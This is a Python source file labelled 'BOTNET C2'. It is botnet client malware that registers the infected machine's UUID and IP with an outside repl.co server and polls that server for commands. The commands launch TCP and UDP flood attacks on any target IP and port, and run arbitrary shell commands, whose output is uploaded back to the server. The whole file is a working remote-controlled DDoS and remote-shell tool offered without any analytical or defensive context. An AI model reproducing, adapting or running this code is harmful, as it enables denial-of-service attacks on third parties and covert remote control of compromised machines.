# BOTNET C2

import requests,socket,os,time,threading,random,string,uuid,base64
stop_command = False
id_leak = []

def DOWNLOAD_CONTENT(FILES, MODE):
    url_content = f'https://stealslotgov.idkotherhex1629.repl.co/download={FILES}&mode={MODE}'
    while True:
        try:
            r = requests.get(url_content)
            break
        except:
            print(f"FAILED DOWNLOAD . . .")
    return r.content

def UPLOAD_CONTENT(FILES, MODE, DATA):
    url_content = f'https://stealslotgov.idkotherhex1629.repl.co/write={DATA}&name={FILES}&mode={MODE}'
    while True:
        try:
            r = requests.get(url_content)
            break
        except:
            print('FAILED UPLOAD . . .')

def UDP_ATTACK(ip, port, booter, size):
    global stop_command
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_loader = os.urandom(size)
        bytes_loader2 = bytearray(os.urandom(size))
        for _ in range(booter):
            if stop_command:
                break
            s.sendto(bytes_loader, (ip, port))
            s.sendto(bytes_loader2, (ip, port))
    except:
        pass

def RUNING_UDP_ATTACK(ip, port, time, booter, size):
    global stop_command
    for _ in range(time):
        if stop_command:
            break
        threading.Thread(target=UDP_ATTACK, args=(ip, port, booter, size)).start()

def TCP_ATTACK(ip, port, spam_send, booter, size):
    global stop_command
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        for _ in range(booter):
            if stop_command:
                break
            for _ in range(spam_send):
                if stop_command:
                    break
                s.sendall(os.urandom(size))
    except:
        pass

def RUNNING_TCP(ip, port, time, spam_send, booter, size):
    for _ in range(time):
        if stop_command:
            break
        threading.Thread(target=TCP_ATTACK, args=(ip, port, spam_send, booter, size)).start()
uuid_load = uuid.uuid1()
s_load = socket.gethostbyname(socket.gethostname())
UPLOAD_CONTENT('NODE_BOT.txt','a',f'{uuid_load}|{s_load}\n')
send_message = False
cmd_runing = False

def CHECKING():
  global uuid_load
  while 1:
     command_check = DOWNLOAD_CONTENT('NODE_CHECKING.txt','r').decode().split('@')
     if command_check[0] == str(uuid_load):
      if command_check[1].upper() == 'CHECKING':
        UPLOAD_CONTENT('UUID_CHECK.txt', 'w', f"{str(uuid_load)}@{command_check[2]}\n")

def CONNECTION_SERVER():
  global send_message,stop_command,id_leak
  command = DOWNLOAD_CONTENT('SERVER_C2.txt','r').decode().split('@')
  if command[0].upper() == 'BOTNET':
  
    if command[1].upper() == 'WAIT':
      if send_message == False:
       send_message = True
       UPLOAD_CONTENT('BOTNET_MESSAGE.txt','w',f'BOTNET WAIT . . .')
    elif command[1].upper() == 'STOP':
      if stop_command == False:
        UPLOAD_CONTENT('BOTNET_MESSAGE.txt','w',f'STOP=False')
        stop_command = True
      else:
        UPLOAD_CONTENT('BOTNET_MESSAGE.txt','w',f'STOP=True')
        stop_command = False
    elif command[1].upper() == 'PING':
      UPLOAD_CONTENT('BOTNET_MESSAGE.txt','w',f'BOTNET PONG . . .')
    if command[1].upper() == 'TCP':
     ip = str(command[2])
     port, time_secs, spam_send, booter, size_tcp = map(int, command[3:8])
     threading.Thread(target=RUNNING_TCP, args=(ip, port, time_secs, spam_send, booter, size_tcp)).start()
     UPLOAD_CONTENT('BOTNET_MESSAGE.txt', 'w', 'BOTNET FLOOD (TCP) . . .')
    elif command[1].upper() == 'UDP':
     ip = str(command[2])
     port, time_secs, booter, size_udp = map(int, command[3:7])
     threading.Thread(target=RUNING_UDP_ATTACK, args=(ip, port, time_secs, booter, size_udp)).start()
     UPLOAD_CONTENT('BOTNET_MESSAGE.txt', 'w', 'BOTNET FLOOD (UDP) . . .')
    elif command[1].upper() == 'CMD':
      try:
        if command[3] in id_leak:
           pass
        else:
           id_leak.append(command[3])
           print(id_leak)
           import subprocess
           output = subprocess.check_output(command[2], shell=True, stderr=subprocess.STDOUT)
           output_str = output.decode()
           UPLOAD_CONTENT(f'CMD_{uuid_load}.txt', 'a', f'EFFECT OF {command[3]}:{command[2]}\n{base64.b16encode(output_str.encode())}\n')
           UPLOAD_CONTENT('BOTNET_MESSAGE.txt','w',f'BOTNET EXECUTE CMD . . .')
      except Exception as e:
        UPLOAD_CONTENT('BOTNET_MESSAGE_ERROR.txt','a',f'ERROR {e} . . .')
    else:
      UPLOAD_CONTENT('BOTNET_MESSAGE.txt','w',f'BOTNET NOT FOUND COMMAND . . .')
  CONNECTION_SERVER()
threading.Thread(target=CHECKING).start()
CONNECTION_SERVER()
